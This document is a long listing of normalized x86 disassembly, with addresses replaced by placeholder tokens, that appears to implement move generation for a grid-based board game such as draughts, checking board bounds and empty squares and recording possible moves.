mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
cmp ecx 0x8
jl r-xdata
mov edi [ ebp - 0x4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov edi [ ebp - 0x8 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp edx 0x6
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ eax + ecx * 4 + 0x2c ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp edx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ eax + ecx * 4 + 0x2c ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
add edx 0xfffffffe
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
add edx 0xfffffffe
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + ecx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + ecx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax + eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax + eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
jmp r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
inc edx
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ edx + edx * 2 ]
mov edx [ ebp - 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ edx + edx * 2 ]
mov edx [ ebp - 0x4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x2c ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 - 0x2c ] 0x20
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x4
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0xa
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
